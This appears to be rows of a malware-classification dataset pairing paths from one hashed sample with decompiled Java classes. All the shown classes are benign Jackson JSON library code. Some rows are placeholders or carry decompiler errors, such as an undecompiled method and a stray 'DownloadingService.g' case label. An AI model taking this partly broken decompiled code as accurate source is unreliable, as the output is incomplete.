2) != 0) {       this._numberBigInt=BigInteger.valueOf(this._numberLong);     }  else     if ((this._numTypesValid & 1) != 0) {       this._numberBigInt=BigInteger.valueOf(this._numberInt);     }  else     if ((this._numTypesValid & 8) != 0) {       this._numberBigInt=BigDecimal.valueOf(this._numberDouble).toBigInteger();     }  else {       _throwInternal();     }     this._numTypesValid|=4;   }   protected void convertNumberToDouble() throws IOException, JsonParseException {     if ((this._numTypesValid & 16) != 0) {       this._numberDouble=this._numberBigDecimal.doubleValue();     }  else     if ((this._numTypesValid & 4) != 0) {       this._numberDouble=this._numberBigInt.doubleValue();     }  else     if ((this._numTypesValid & 2) != 0) {       this._numberDouble=this._numberLong;     }  else     if ((this._numTypesValid & 1) != 0) {       this._numberDouble=this._numberInt;     }  else {       _throwInternal();     }     this._numTypesValid|=8;   }   protected void convertNumberToBigDecimal() throws IOException, JsonParseException {     if ((this._numTypesValid & 8) != 0) {       this._numberBigDecimal=new BigDecimal(getText());     }  else     if ((this._numTypesValid & 4) != 0) {       this._numberBigDecimal=new BigDecimal(this._numberBigInt);     }  else     if ((this._numTypesValid & 2) != 0) {       this._numberBigDecimal=BigDecimal.valueOf(this._numberLong);     }  else     if ((this._numTypesValid & 1) != 0) {       this._numberBigDecimal=BigDecimal.valueOf(this._numberInt);     }  else {       _throwInternal();     }     this._numTypesValid|=16;   }   public void reportUnexpectedNumberChar(  int ch,  String comment) throws JsonParseException {     String msg=""Unexpected character ("" + _getCharDesc(ch) + "") in numeric value"";     if (comment != null) {       msg=String.valueOf(msg) + "": "" + comment;     }     _reportError(msg);   }   public void reportInvalidNumber(  String msg) throws JsonParseException {     _reportError(""Invalid numeric value: "" + msg);   }   protected void reportOverflowInt() throws IOException, JsonParseException {     _reportError(""Numeric value ("" + getText() + "") out of range of int (-2147483648 - 2147483647)"");   }   protected void reportOverflowLong() throws IOException, JsonParseException {     _reportError(""Numeric value ("" + getText() + "") out of range of long (-9223372036854775808 - 9223372036854775807)"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\JsonParserBase.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6e7b4d3d"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\JsonReadContext.code","public final class JsonReadContext extends JsonStreamContext {   JsonReadContext _child;   protected int _columnNr;   protected String _currentName;   protected int _lineNr;   protected final JsonReadContext _parent;   public JsonReadContext(  JsonReadContext parent,  int type,  int lineNr,  int colNr){     super(type);     this._child=null;     this._parent=parent;     this._lineNr=lineNr;     this._columnNr=colNr;   }   protected final void reset(  int type,  int lineNr,  int colNr){     this._type=type;     this._index=-1;     this._lineNr=lineNr;     this._columnNr=colNr;     this._currentName=null;   }   public static JsonReadContext createRootContext(  int lineNr,  int colNr){     return new JsonReadContext(null,0,lineNr,colNr);   }   public final JsonReadContext createChildArrayContext(  int lineNr,  int colNr){     JsonReadContext ctxt=this._child;     if (ctxt == null) {       JsonReadContext jsonReadContext=new JsonReadContext(this,1,lineNr,colNr);       this._child=jsonReadContext;       return jsonReadContext;     }     ctxt.reset(1,lineNr,colNr);     return ctxt;   }   public final JsonReadContext createChildObjectContext(  int lineNr,  int colNr){     JsonReadContext ctxt=this._child;     if (ctxt == null) {       JsonReadContext jsonReadContext=new JsonReadContext(this,2,lineNr,colNr);       this._child=jsonReadContext;       return jsonReadContext;     }     ctxt.reset(2,lineNr,colNr);     return ctxt;   }   @Override public final String getCurrentName(){     return this._currentName;   }   @Override public final JsonReadContext getParent(){     return this._parent;   }   public final JsonLocation getStartLocation(  Object srcRef){     return new JsonLocation(srcRef,-1L,this._lineNr,this._columnNr);   }   public final boolean expectComma(){     int ix=this._index + 1;     this._index=ix;     return this._type != 0 && ix > 0;   }   public void setCurrentName(  String name){     this._currentName=name;   }   public final String toString(){     StringBuilder sb=new StringBuilder(64); switch (this._type) { case DownloadingService.g:       sb.append(""/"");     break; case 1:   sb.append('['); sb.append(getCurrentIndex()); sb.append(']'); break; case 2: sb.append('{'); if (this._currentName != null) { sb.append('\""'); CharTypes.appendQuoted(sb,this._currentName); sb.append('\""'); }  else { sb.append('?'); } sb.append(']'); break; } return sb.toString(); } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\JsonWriteContext.code","public abstract class JsonWriteContext extends JsonStreamContext {   public static final int STATUS_EXPECT_NAME=5;   public static final int STATUS_EXPECT_VALUE=4;   public static final int STATUS_OK_AFTER_COLON=2;   public static final int STATUS_OK_AFTER_COMMA=1;   public static final int STATUS_OK_AFTER_SPACE=3;   public static final int STATUS_OK_AS_IS=0;   JsonWriteContext _childArray;   JsonWriteContext _childObject;   protected final JsonWriteContext _parent;   protected abstract void appendDesc(  StringBuilder sb);   public abstract int writeFieldName(  String str);   public abstract int writeValue();   public JsonWriteContext(  int type,  JsonWriteContext parent){     super(type);     this._childArray=null;     this._childObject=null;     this._parent=parent;   }   public static JsonWriteContext createRootContext(){     return new RootWContext();   }   public final JsonWriteContext createChildArrayContext(){     JsonWriteContext ctxt=this._childArray;     if (ctxt == null) {       JsonWriteContext ctxt2=new ArrayWContext(this);       this._childArray=ctxt2;       return ctxt2;     }     ctxt._index=-1;     return ctxt;   }   public final JsonWriteContext createChildObjectContext(){     JsonWriteContext ctxt=this._childObject;     if (ctxt == null) {       JsonWriteContext ctxt2=new ObjectWContext(this);       this._childObject=ctxt2;       return ctxt2;     }     ctxt._index=-1;     return ctxt;   }   @Override public final JsonWriteContext getParent(){     return this._parent;   }   public final String toString(){     StringBuilder sb=new StringBuilder(64);     appendDesc(sb);     return sb.toString();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\Lf2SpacesIndenter.code","public static class Lf2SpacesIndenter implements Indenter {   static final char[] SPACES;   static final int SPACE_COUNT=64;   static final String SYSTEM_LINE_SEPARATOR; static {     String lf=null;     try {       lf=System.getProperty(""line.separator"");     }  catch (    Throwable th) {     }     SYSTEM_LINE_SEPARATOR=lf == null ? ""\n"" : lf;     SPACES=new char[64];     Arrays.fill(SPACES,' ');   }   @Override public boolean isInline(){     return false;   }   @Override public void writeIndentation(  JsonGenerator jg,  int level) throws IOException, JsonGenerationException {     jg.writeRaw(SYSTEM_LINE_SEPARATOR);     int level2=level + level;     while (level2 > 64) {       jg.writeRaw(SPACES,0,64);       level2-=SPACES.length;     }     jg.writeRaw(SPACES,0,level2);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\NopIndenter.code","public static class NopIndenter implements Indenter {   @Override public void writeIndentation(  JsonGenerator jg,  int level){   }   @Override public boolean isInline(){     return true;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\ObjectWContext.code","public final class ObjectWContext extends JsonWriteContext {   protected String _currentName;   protected boolean _expectValue;   public ObjectWContext(  JsonWriteContext parent){     super(2,parent);     this._currentName=null;     this._expectValue=false;   }   @Override public String getCurrentName(){     return this._currentName;   }   @Override public int writeFieldName(  String name){     if (this._currentName != null) {       return 4;     }     this._currentName=name;     return this._index < 0 ? 0 : 1;   }   @Override public int writeValue(){     if (this._currentName == null) {       return 5;     }     this._currentName=null;     this._index++;     return 2;   }   @Override protected void appendDesc(  StringBuilder sb){     sb.append('{');     if (this._currentName != null) {       sb.append('\""');       sb.append(this._currentName);       sb.append('\""');     }  else {       sb.append('?');     }     sb.append(']');   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\ReaderBasedNumericParser.code","public abstract class ReaderBasedNumericParser extends ReaderBasedParserBase {   public ReaderBasedNumericParser(  IOContext pc,  int features,  Reader r){     super(pc,features,r);   }   @Override public final org.codehaus.jackson.JsonToken parseNumberText(  int r12) throws java.io.IOException, org.codehaus.jackson.JsonParseException {     throw new UnsupportedOperationException(""Method not decompiled: org.codehaus.jackson.impl.ReaderBasedNumericParser.parseNumberText(int):org.codehaus.jackson.JsonToken"");   }   private final JsonToken parseNumberText2(  boolean negative) throws IOException, JsonParseException {     char c;     char c2;     int outPtr;     char[] outBuf=this._textBuffer.emptyAndGetCurrentSegment();     int outPtr2=0;     if (negative) {       int outPtr3=0 + 1;       outBuf[0]='-';       outPtr2=outPtr3;     }     int intLen=0;     boolean eof=false;     while (true) {       if (this._inputPtr >= this._inputEnd && !loadMore()) {         c=0;         eof=true;         break;       }       char[] cArr=this._inputBuffer;       int i=this._inputPtr;       this._inputPtr=i + 1;       c=cArr[i];       if (c < '0' || c > '9') {         break;       }       intLen++;       if (intLen == 2 && outBuf[outPtr2 - 1] == '0') {         reportInvalidNumber(""Leading zeroes not allowed"");       }       if (outPtr2 >= outBuf.length) {         outBuf=this._textBuffer.finishCurrentSegment();         outPtr2=0;       }       outBuf[outPtr2]=c;       outPtr2++;     }     if (intLen == 0) {       reportInvalidNumber(""Missing integer part (next char "" + _getCharDesc(c) + "")"");     }     int fractLen=0;     if (c == '.') {       int outPtr4=outPtr2 + 1;       outBuf[outPtr2]=c;       while (true) {         outPtr2=outPtr4;         if (this._inputPtr >= this._inputEnd && !loadMore()) {           eof=true;           break;         }         char[] cArr2=this._inputBuffer;         int i2=this._inputPtr;         this._inputPtr=i2 + 1;         c=cArr2[i2];         if (c < '0' || c > '9') {           break;         }         fractLen++;         if (outPtr2 >= outBuf.length) {           outBuf=this._textBuffer.finishCurrentSegment();           outPtr2=0;         }         outPtr4=outPtr2 + 1;         outBuf[outPtr2]=c;       }       if (fractLen == 0) {         reportUnexpectedNumberChar(c,""Decimal point not followed by a digit"");       }     }     int expLen=0;     if (c == 'e' || c == 'E') {       if (outPtr2 >= outBuf.length) {         outBuf=this._textBuffer.finishCurrentSegment();         outPtr2=0;       }       int outPtr5=outPtr2 + 1;       outBuf[outPtr2]=c;       if (this._inputPtr < this._inputEnd) {         char[] cArr3=this._inputBuffer;         int i3=this._inputPtr;         this._inputPtr=i3 + 1;         c2=cArr3[i3];       }  else {         c2=getNextChar(""expected a digit for number exponent"");       }       if (c2 == '-' || c2 == '+') {         if (outPtr5 >= outBuf.length) {           outBuf=this._textBuffer.finishCurrentSegment();           outPtr=0;         }  else {           outPtr=outPtr5;         }         outPtr5=outPtr + 1;         outBuf[outPtr]=c2;         if (this._inputPtr < this._inputEnd) {           char[] cArr4=this._inputBuffer;           int i4=this._inputPtr;           this._inputPtr=i4 + 1;           c2=cArr4[i4];         }  else {           c2=getNextChar(""expected a digit for number exponent"");         }       }       while (true) {         outPtr2=outPtr5;         if (c2 > '9' || c2 < '0') {           break;         }         expLen++;         if (outPtr2 >= outBuf.length) {           outBuf=this._textBuffer.finishCurrentSegment();           outPtr2=0;         }         outPtr5=outPtr2 + 1;         outBuf[outPtr2]=c2;         if (this._inputPtr >= this._inputEnd && !loadMore()) {           eof=true;           outPtr2=outPtr5;           break;         }         char[] cArr5=this._inputBuffer;         int i5=this._inputPtr;         this._inputPtr=i5 + 1;         c2=cArr5[i5];       }       if (expLen == 0) {         reportUnexpectedNumberChar(c2,""Exponent indicator not followed by a digit"");       }     }     if (!eof) {       this._inputPtr--;     }     this._textBuffer.setCurrentLength(outPtr2);     return reset(negative,intLen,fractLen,expLen);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\ReaderBasedParser.code","!org.eclipse.jdt.core.dom.TypeDeclaration@79cc4b1e"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\ReaderBasedParserBase.code","public abstract class ReaderBasedParserBase extends JsonNumericParserBase {   protected char[] _inputBuffer;   protected Reader _reader;   public ReaderBasedParserBase(  IOContext ctxt,  int features,  Reader r){     super(ctxt,features);     this._reader=r;     this._inputBuffer=ctxt.allocTokenBuffer();   }   @Override public final boolean loadMore() throws IOException {     this._currInputProcessed+=this._inputEnd;     this._currInputRowStart-=this._inputEnd;     if (this._reader != null) {       int count=this._reader.read(this._inputBuffer,0,this._inputBuffer.length);       if (count > 0) {         this._inputPtr=0;         this._inputEnd=count;         return true;       }       _closeInput();       if (count == 0) {         throw new IOException(""Reader returned 0 characters when trying to read "" + this._inputEnd);       }     }     return false;   }   public char getNextChar(  String eofMsg) throws IOException, JsonParseException {     if (this._inputPtr >= this._inputEnd && !loadMore()) {       _reportInvalidEOF(eofMsg);     }     char[] cArr=this._inputBuffer;     int i=this._inputPtr;     this._inputPtr=i + 1;     return cArr[i];   }   @Override protected void _closeInput() throws IOException {     if (this._reader != null) {       if (this._ioContext.isResourceManaged() || isEnabled(JsonParser.Feature.AUTO_CLOSE_SOURCE)) {         this._reader.close();       }       this._reader=null;     }   }   @Override public void _releaseBuffers() throws IOException {     super._releaseBuffers();     char[] buf=this._inputBuffer;     if (buf != null) {       this._inputBuffer=null;       this._ioContext.releaseTokenBuffer(buf);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\RootWContext.code","public final class RootWContext extends JsonWriteContext {   public RootWContext(){     super(0,null);   }   @Override public String getCurrentName(){     return null;   }   @Override public int writeFieldName(  String name){     return 4;   }   @Override public int writeValue(){     this._index++;     return this._index == 0 ? 0 : 3;   }   @Override protected void appendDesc(  StringBuilder sb){     sb.append(""/"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\StreamBasedParserBase.code","public abstract class StreamBasedParserBase extends JsonNumericParserBase {   protected boolean _bufferRecyclable;   protected byte[] _inputBuffer;   protected InputStream _inputStream;   public StreamBasedParserBase(  IOContext ctxt,  int features,  InputStream in,  byte[] inputBuffer,  int start,  int end,  boolean bufferRecyclable){     super(ctxt,features);     this._inputStream=in;     this._inputBuffer=inputBuffer;     this._inputPtr=start;     this._inputEnd=end;     this._bufferRecyclable=bufferRecyclable;   }   @Override public final boolean loadMore() throws IOException {     this._currInputProcessed+=this._inputEnd;     this._currInputRowStart-=this._inputEnd;     if (this._inputStream != null) {       int count=this._inputStream.read(this._inputBuffer,0,this._inputBuffer.length);       if (count > 0) {         this._inputPtr=0;         this._inputEnd=count;         return true;       }       _closeInput();       if (count == 0) {         throw new IOException(""Reader returned 0 characters when trying to read "" + this._inputEnd);       }     }     return false;   }   @Override protected void _closeInput() throws IOException {     if (this._inputStream != null) {       if (this._ioContext.isResourceManaged() || isEnabled(JsonParser.Feature.AUTO_CLOSE_SOURCE)) {         this._inputStream.close();       }       this._inputStream=null;     }   }   @Override public void _releaseBuffers() throws IOException {     byte[] buf;     super._releaseBuffers();     if (this._bufferRecyclable && (buf=this._inputBuffer) != null) {       this._inputBuffer=null;       this._ioContext.releaseReadIOBuffer(buf);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\Utf8NumericParser.code","public abstract class Utf8NumericParser extends StreamBasedParserBase {   public Utf8NumericParser(  IOContext pc,  int features,  InputStream in,  byte[] inputBuffer,  int start,  int end,  boolean bufferRecyclable){     super(pc,features,in,inputBuffer,start,end,bufferRecyclable);   }   @Override public final JsonToken parseNumberText(  int c) throws IOException, JsonParseException {     int outPtr;     int outPtr2;     int outPtr3;     char[] outBuf=this._textBuffer.emptyAndGetCurrentSegment();     int outPtr4=0;     boolean negative=c == 45;     if (negative) {       int outPtr5=0 + 1;       outBuf[0]='-';       if (this._inputPtr >= this._inputEnd) {         loadMoreGuaranteed();       }       byte[] bArr=this._inputBuffer;       int i=this._inputPtr;       this._inputPtr=i + 1;       c=bArr[i] & 255;       outPtr4=outPtr5;     }     int intLen=0;     boolean eof=false;     while (true) {       if (c < 48) {         outPtr=outPtr4;         break;       }       if (c <= 57) {         intLen++;         if (intLen == 2 && outBuf[outPtr4 - 1] == '0') {           reportInvalidNumber(""Leading zeroes not allowed"");         }         if (outPtr4 >= outBuf.length) {           outBuf=this._textBuffer.finishCurrentSegment();           outPtr4=0;         }         outPtr=outPtr4 + 1;         outBuf[outPtr4]=(char)c;         if (this._inputPtr >= this._inputEnd && !loadMore()) {           c=0;           eof=true;           break;         }         byte[] bArr2=this._inputBuffer;         int i2=this._inputPtr;         this._inputPtr=i2 + 1;         c=bArr2[i2] & 255;         outPtr4=outPtr;       }  else {         outPtr=outPtr4;         break;       }     }     if (intLen == 0) {       reportInvalidNumber(""Missing integer part (next char "" + _getCharDesc(c) + "")"");     }     int fractLen=0;     if (c == 46) {       outPtr2=outPtr + 1;       outBuf[outPtr]=(char)c;       while (true) {         if (this._inputPtr >= this._inputEnd && !loadMore()) {           eof=true;           break;         }         byte[] bArr3=this._inputBuffer;         int i3=this._inputPtr;         this._inputPtr=i3 + 1;         c=bArr3[i3] & 255;         if (c < 48 || c > 57) {           break;         }         fractLen++;         if (outPtr2 >= outBuf.length) {           outBuf=this._textBuffer.finishCurrentSegment();           outPtr2=0;         }         outBuf[outPtr2]=(char)c;         outPtr2++;       }       if (fractLen == 0) {         reportUnexpectedNumberChar(c,""Decimal point not followed by a digit"");       }     }  else {       outPtr2=outPtr;     }     int expLen=0;     if (c == 101 || c == 69) {       if (outPtr2 >= outBuf.length) {         outBuf=this._textBuffer.finishCurrentSegment();         outPtr2=0;       }       int outPtr6=outPtr2 + 1;       outBuf[outPtr2]=(char)c;       if (this._inputPtr >= this._inputEnd) {         loadMoreGuaranteed();       }       byte[] bArr4=this._inputBuffer;       int i4=this._inputPtr;       this._inputPtr=i4 + 1;       int c2=bArr4[i4] & 255;       if (c2 == 45 || c2 == 43) {         if (outPtr6 >= outBuf.length) {           outBuf=this._textBuffer.finishCurrentSegment();           outPtr3=0;         }  else {           outPtr3=outPtr6;         }         outPtr6=outPtr3 + 1;         outBuf[outPtr3]=(char)c2;         if (this._inputPtr >= this._inputEnd) {           loadMoreGuaranteed();         }         byte[] bArr5=this._inputBuffer;         int i5=this._inputPtr;         this._inputPtr=i5 + 1;         c2=bArr5[i5] & 255;       }       while (true) {         outPtr2=outPtr6;         if (c2 > 57 || c2 < 48) {           break;         }         expLen++;         if (outPtr2 >= outBuf.length) {           outBuf=this._textBuffer.finishCurrentSegment();           outPtr2=0;         }         outPtr6=outPtr2 + 1;         outBuf[outPtr2]=(char)c2;         if (this._inputPtr >= this._inputEnd && !loadMore()) {           eof=true;           outPtr2=outPtr6;           break;         }         byte[] bArr6=this._inputBuffer;         int i6=this._inputPtr;         this._inputPtr=i6 + 1;         c2=bArr6[i6] & 255;       }       if (expLen == 0) {         reportUnexpectedNumberChar(c2,""Exponent indicator not followed by a digit"");       }     }     if (!eof) {       this._inputPtr--;     }     this._textBuffer.setCurrentLength(outPtr2);     return reset(negative,intLen,fractLen,expLen);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\Utf8StreamParser.code","!org.eclipse.jdt.core.dom.TypeDeclaration@155bbd2a"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\WriterBasedGenerator.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2e2c3359"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.io\BaseReader.code","abstract class BaseReader extends Reader {   protected static final int LAST_VALID_UNICODE_CHAR=1114111;   protected static final char NULL_BYTE=0;   protected static final char NULL_CHAR=0;   protected byte[] mBuffer;   protected final IOContext mContext;   protected InputStream mIn;   protected int mLength;   protected int mPtr;   char[] mTmpBuf=null;   public BaseReader(  IOContext context,  InputStream in,  byte[] buf,  int ptr,  int len){     this.mContext=context;     this.mIn=in;     this.mBuffer=buf;     this.mPtr=ptr;     this.mLength=len;   }   @Override public void close() throws IOException {     InputStream in=this.mIn;     if (in != null) {       this.mIn=null;       freeBuffers();       in.close();     }   }   @Override public int read() throws IOException {     if (this.mTmpBuf == null) {       this.mTmpBuf=new char[1];     }     if (read(this.mTmpBuf,0,1) < 1) {       return -1;     }     return this.mTmpBuf[0];   }   public final void freeBuffers(){     byte[] buf=this.mBuffer;     if (buf != null) {       this.mBuffer=null;       this.mContext.releaseReadIOBuffer(buf);     }   }   public void reportBounds(  char[] cbuf,  int start,  int len) throws IOException {     throw new ArrayIndexOutOfBoundsException(""read(buf,"" + start + "",""+ len+ ""), cbuf[""+ cbuf.length+ ""]"");   }   public void reportStrangeStream() throws IOException {     throw new IOException(""Strange I/O stream, returned 0 bytes on read"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.io\IOContext.code","public final class IOContext {   final BufferRecycler _bufferRecycler;   protected JsonEncoding _encoding;   protected final boolean _managedResource;   final Object _sourceRef;   protected byte[] _readIOBuffer=null;   protected byte[] _writeEncodingBuffer=null;   protected char[] _tokenCBuffer=null;   protected char[] _concatCBuffer=null;   protected char[] _nameCopyBuffer=null;   public IOContext(  BufferRecycler br,  Object sourceRef,  boolean managedResource){     this._bufferRecycler=br;     this._sourceRef=sourceRef;     this._managedResource=managedResource;   }   public void setEncoding(  JsonEncoding enc){     this._encoding=enc;   }   public Object getSourceReference(){     return this._sourceRef;   }   public JsonEncoding getEncoding(){     return this._encoding;   }   public boolean isResourceManaged(){     return this._managedResource;   }   public TextBuffer constructTextBuffer(){     return new TextBuffer(this._bufferRecycler);   }   public byte[] allocReadIOBuffer(){     if (this._readIOBuffer != null) {       throw new IllegalStateException(""Trying to call allocReadIOBuffer() second time"");     }     this._readIOBuffer=this._bufferRecycler.allocByteBuffer(BufferRecycler.ByteBufferType.READ_IO_BUFFER);     return this._readIOBuffer;   }   public byte[] allocWriteEncodingBuffer(){     if (this._writeEncodingBuffer != null) {       throw new IllegalStateException(""Trying to call allocWriteEncodingBuffer() second time"");     }     this._writeEncodingBuffer=this._bufferRecycler.allocByteBuffer(BufferRecycler.ByteBufferType.WRITE_ENCODING_BUFFER);     return this._writeEncodingBuffer;   }   public char[] allocTokenBuffer(){     if (this._tokenCBuffer != null) {       throw new IllegalStateException(""Trying to call allocTokenBuffer() second time"");     }     this._tokenCBuffer=this._bufferRecycler.allocCharBuffer(BufferRecycler.CharBufferType.TOKEN_BUFFER);     return this._tokenCBuffer;   }   public char[] allocConcatBuffer(){     if (this._concatCBuffer != null) {       throw new IllegalStateException(""Trying to call allocConcatBuffer() second time"");     }     this._concatCBuffer=this._bufferRecycler.allocCharBuffer(BufferRecycler.CharBufferType.CONCAT_BUFFER);     return this._concatCBuffer;   }   public char[] allocNameCopyBuffer(  int minSize){     if (this._nameCopyBuffer != null) {       throw new IllegalStateException(""Trying to call allocNameCopyBuffer() second time"");     }     this._nameCopyBuffer=this._bufferRecycler.allocCharBuffer(BufferRecycler.CharBufferType.NAME_COPY_BUFFER,minSize);     return this._nameCopyBuffer;   }   public void releaseReadIOBuffer(  byte[] buf){     if (buf != null) {       if (buf != this._readIOBuffer) {         throw new IllegalArgumentException(""Trying to release buffer not owned by the context"");       }       this._readIOBuffer=null;       this._bufferRecycler.releaseByteBuffer(BufferRecycler.ByteBufferType.READ_IO_BUFFER,buf);     }   }   public void releaseWriteEncodingBuffer(  byte[] buf){     if (buf != null) {       if (buf != this._writeEncodingBuffer) {         throw new IllegalArgumentException(""Trying to release buffer not owned by the context"");       }       this._writeEncodingBuffer=null;       this._bufferRecycler.releaseByteBuffer(BufferRecycler.ByteBufferType.WRITE_ENCODING_BUFFER,buf);     }   }   public void releaseTokenBuffer(  char[] buf){     if (buf != null) {       if (buf != this._tokenCBuffer) {         throw new IllegalArgumentException(""Trying to release buffer not owned by the context"");       }       this._tokenCBuffer=null;       this._bufferRecycler.releaseCharBuffer(BufferRecycler.CharBufferType.TOKEN_BUFFER,buf);     }   }   public void releaseConcatBuffer(  char[] buf){     if (buf != null) {       if (buf != this._concatCBuffer) {         throw new IllegalArgumentException(""Trying to release buffer not owned by the context"");       }       this._concatCBuffer=null;       this._bufferRecycler.releaseCharBuffer(BufferRecycler.CharBufferType.CONCAT_BUFFER,buf);     }   }   public void releaseNameCopyBuffer(  char[] buf){     if (buf != null) {       if (buf != this._nameCopyBuffer) {         throw new IllegalArgumentException(""Trying to release buffer not owned by the context"");       }       this._nameCopyBuffer=null;       this._bufferRecycler.releaseCharBuffer(BufferRecycler.CharBufferType.NAME_COPY_BUFFER,buf);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.io\MergedStream.code","public final class MergedStream extends InputStream {   byte[] _buffer;   protected final IOContext _context;   final int _end;   final InputStream _in;   int _ptr;   public MergedStream(  IOContext context,  InputStream in,  byte[] buf,  int start,  int end){     this._context=context;     this._in=in;     this._buffer=buf;     this._ptr=start;     this._end=end;   }   @Override public int available() throws IOException {     return this._buffer != null ? this._end - this._ptr : this._in.available();   }   @Override public void close() throws IOException {     freeMergedBuffer();     this._in.close();   }   @Override public void mark(  int readlimit){     if (this._buffer == null) {       this._in.mark(readlimit);     }   }   @Override public boolean markSupported(){     return this._buffer == null && this._in.markSupported();   }   @Override public int read() throws IOException {     if (this._buffer == null) {       return this._in.read();     }     byte[] bArr=this._buffer;     int i=this._ptr;     this._ptr=i + 1;     int c=bArr[i] & 255;     if (this._ptr >= this._end) {       freeMergedBuffer();     }     return c;   }   @Override public int read(  byte[] b) throws IOException {     return read(b,0,b.length);   }   @Override public int read(  byte[] b,  int off,  int len) throws IOException {     if (this._buffer == null) {       return this._in.read(b,off,len);     }     int avail=this._end - this._ptr;     if (len > avail) {       len=avail;     }     System.arraycopy(this._buffer,this._ptr,b,off,len);     this._ptr+=len;     if (this._ptr >= this._end) {       freeMergedBuffer();     }     return len;   }   @Override public void reset() throws IOException {     if (this._buffer == null) {       this._in.reset();     }   }   @Override public long skip(  long n) throws IOException {     long count=0;     if (this._buffer != null) {       int amount=this._end - this._ptr;       if (amount > n) {         this._ptr+=(int)n;         return n;       }       freeMergedBuffer();       count=0 + amount;       n-=amount;     }     if (n > 0) {       count+=this._in.skip(n);     }     return count;   }   private void freeMergedBuffer(){     byte[] buf=this._buffer;     if (buf != null) {       this._buffer=null;       this._context.releaseReadIOBuffer(buf);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.io\NumberInput.code","public final class NumberInput {   static final long L_BILLION=1000000000;   static final String MIN_LONG_STR_NO_SIGN=String.valueOf(Long.MIN_VALUE).substring(1);   static final String MAX_LONG_STR=String.valueOf(Long.MAX_VALUE);   public static final int parseInt(  char[] digitChars,  int offset,  int len){     int num=digitChars[offset] - '0';     int len2=len + offset;     int offset2=offset + 1;     if (offset2 < len2) {       int num2=(num * 10) + (digitChars[offset2] - '0');       int offset3=offset2 + 1;       if (offset3 < len2) {         int num3=(num2 * 10) + (digitChars[offset3] - '0');         int offset4=offset3 + 1;         if (offset4 < len2) {           int num4=(num3 * 10) + (digitChars[offset4] - '0');           int offset5=offset4 + 1;           if (offset5 < len2) {             int num5=(num4 * 10) + (digitChars[offset5] - '0');             int offset6=offset5 + 1;             if (offset6 < len2) {               int num6=(num5 * 10) + (digitChars[offset6] - '0');               int offset7=offset6 + 1;               if (offset7 < len2) {                 int num7=(num6 * 10) + (digitChars[offset7] - '0');                 int offset8=offset7 + 1;                 if (offset8 < len2) {                   int num8=(num7 * 10) + (digitChars[offset8] - '0');                   int offset9=offset8 + 1;                   if (offset9 < len2) {                     return (num8 * 10) + (digitChars[offset9] - '0');                   }                   return num8;                 }                 return num7;               }               return num6;             }             return num5;           }           return num4;         }         return num3;       }       return num2;     }     return num;   }   public static final long parseLong(  char[] digitChars,  int offset,  int len){     int len1=len - 9;     long val=parseInt(digitChars,offset,len1) * L_BILLION;     return parseInt(digitChars,offset + len1,9) + val;   }   public static final boolean inLongRange(  char[] digitChars,  int offset,  int len,  boolean negative){     String cmpStr=negative ? MIN_LONG_STR_NO_SIGN : MAX_LONG_STR;     int cmpLen=cmpStr.length();     if (len < cmpLen) {       return true;     }     if (len > cmpLen) {       return false;     }     for (int i=0; i < cmpLen; i++) {       if (digitChars[offset + i] > cmpStr.charAt(i)) {         return false;       }     }     return true;   }   public static final boolean inLongRange(  String numberStr,  boolean negative){     String cmpStr=negative ? MIN_LONG_STR_NO_SIGN : MAX_LONG_STR;     int cmpLen=cmpStr.length();     int actualLen=numberStr.length();     if (actualLen < cmpLen) {       return true;     }     if (actualLen > cmpLen) {       return false;     }     for (int i=0; i < cmpLen; i++) {       if (numberStr.charAt(i) > cmpStr.charAt(i)) {         return false;       }     }     return true;   } } "
